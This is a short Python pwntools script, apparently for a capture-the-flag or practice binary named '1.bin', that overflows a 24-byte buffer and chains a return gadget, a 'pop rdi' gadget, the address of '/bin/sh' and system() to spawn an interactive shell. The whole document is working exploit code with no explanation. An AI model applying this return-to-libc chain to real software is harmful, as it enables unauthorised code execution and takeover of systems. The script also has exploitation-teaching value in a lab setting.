
from pwn import *

RET = 0x000000000040101a
POP_RDI = 0x00000000004011c3
BIN_SH = 0x7ffff7f745bd
SYSTEM = 0x7ffff7e12290

p = process("./1.bin")
#p = gdb.debug("./1.bin")

p.send(b"A"*24 + p64(RET) + p64(POP_RDI) + p64(BIN_SH) + p64(SYSTEM) + b"\n")

p.interactive()

